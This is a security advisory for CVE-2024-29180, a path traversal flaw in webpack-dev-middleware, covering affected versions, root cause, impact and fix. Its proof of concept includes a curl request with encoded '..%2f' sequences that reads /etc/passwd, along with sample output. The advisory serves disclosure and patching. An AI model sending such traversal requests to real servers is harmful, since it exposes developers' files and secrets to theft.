# [H] Path traversal in webpack-dev-middleware

## Summary
Severity: High
Advisory: GHSA-wr3j-pwj9-hqq6
CVE: CVE-2024-29180
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2024-03-21
Source: https://github.com/advisories/GHSA-wr3j-pwj9-hqq6
Type: github-advisory

## Affected
- npm: `webpack-dev-middleware` — affected >=7.0.0 <7.1.0
- npm: `webpack-dev-middleware` — affected >=6.0.0 <6.1.2
- npm: `webpack-dev-middleware` — affected >=0 <5.3.4

## Details
### Summary
_The **webpack-dev-middleware** middleware does not validate the supplied URL address sufficiently before returning the local file. It is possible to access any file on the developer's machine._

### Details
The middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory _memfs_ filesystem.
If _writeToDisk_ configuration option is set to **true**, the physical filesystem is used:
[https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/setupOutputFileSystem.js#L21](https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/setupOutputFileSystem.js#L21)

The _**getFilenameFromUrl**_ method is used to parse URL and build the local file path.
The public path prefix is stripped from the URL, and the **unsecaped** path suffix is appended to the _outputPath_:
[https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82](https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82)
As the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use _%2e_ and _%2f_ sequences to perform path traversal attack.

### PoC
_A blank project can be created containing the following configuration file **webpack.config.js**:_
`module.exports = {
  devServer: {
    devMiddleware: {
      writeToDisk: true
    }
  }
};
`

When started, it is possible to access any local file, e.g. _/etc/passwd_:
`$ curl localhost:8080/public/..%2f..%2f..%2f..%2f../etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

### Impact
The developers using _webpack-dev-server_ or _webpack-dev-middleware_ are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).

If the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).

If the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.

### Recommendation
The URL should be unescaped and normalized before any further processing.

## References
- https://github.com/webpack/webpack-dev-middleware/security/advisories/GHSA-wr3j-pwj9-hqq6
- https://nvd.nist.gov/vuln/detail/CVE-2024-29180
- https://github.com/webpack/webpack-dev-middleware/commit/189c4ac7d2344ec132a4689e74dc837ec5be0132
- https://github.com/webpack/webpack-dev-middleware/commit/9670b3495da518fe667ff3428c5e4cb9f2f3d353
- https://github.com/webpack/webpack-dev-middleware/commit/e10008c762e4d5821ed6990348dabf0d4d93a10e
- https://github.com/webpack/webpack-dev-middleware
- https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82
- https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/setupOutputFileSystem.js#L21
- https://github.com/webpack/webpack-dev-middleware/releases/tag/v5.3.4
- https://github.com/webpack/webpack-dev-middleware/releases/tag/v6.1.2
- https://github.com/webpack/webpack-dev-middleware/releases/tag/v7.1.0
